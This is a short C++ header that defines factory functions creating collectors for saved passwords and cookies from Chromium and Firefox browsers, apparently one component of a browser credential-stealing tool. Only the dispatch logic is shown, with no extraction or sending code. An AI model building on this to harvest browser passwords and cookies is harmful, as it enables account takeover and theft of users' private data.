#pragma once
#include "ICollector.h"
#include "ChromePasswordCollecter.h"
#include "FireFoxParser.h"
#include "ChromeCookiesCollecter.h"
#include "FireFoxCookiesParser.h"

namespace collector
{
	enum class BrowserType
	{
		None,
		Chromium = 32,
		Mozilla = 64,
	};

	inline ICollector<AccountData>* create_password_collector(BrowserType type_collector)
	{
		switch (type_collector)
		{
			case BrowserType::None: return nullptr;
			case BrowserType::Chromium: return new ChromePasswordCollecter();
			case BrowserType::Mozilla: return new FireFoxParser();
			default: return nullptr;;
		}
	}

	inline ICollector<CookieData>* create_cookies_collector(BrowserType type_collector)
	{
		switch (type_collector)
		{
		case BrowserType::None: return nullptr;
		case BrowserType::Chromium: return new ChromeCookiesCollecter();
		case BrowserType::Mozilla: return new FireFoxCookiesParser();
		default: return nullptr;;
		}
	}


	
}
